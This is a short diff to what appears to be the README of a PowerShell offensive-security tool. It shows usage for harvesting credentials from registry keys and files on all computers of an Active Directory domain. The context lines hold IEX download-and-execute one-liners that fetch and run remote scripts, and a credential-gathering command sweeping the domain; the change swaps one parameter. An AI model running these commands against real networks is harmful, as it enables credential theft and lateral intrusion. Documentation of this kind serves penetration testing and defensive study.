@@ -111,7 +111,7 @@ Gather credentials from common registry keys and files on all domain computers (
 PS C:\> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/tmenochet/PowerScan/master/PowerScan.ps1')
 PS C:\> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/tmenochet/PowerScan/master/Post/Get-CimCredential.ps1')
 PS C:\> $cred = Get-Credential Administrator@ADATUM.CORP
-PS C:\> Invoke-PowerScan -ScriptBlock ${Function:Get-CimCredential} -ScriptParameters @{Credential=$cred; DownloadFiles=$true} -ComputerDomain ADATUM.CORP -Credential $cred
+PS C:\> Invoke-PowerScan -ScriptBlock ${Function:Get-CimCredential} -ScriptParameters @{Credential=$cred; Ping=$true} -ComputerDomain ADATUM.CORP -Credential $cred
 ```
 
 
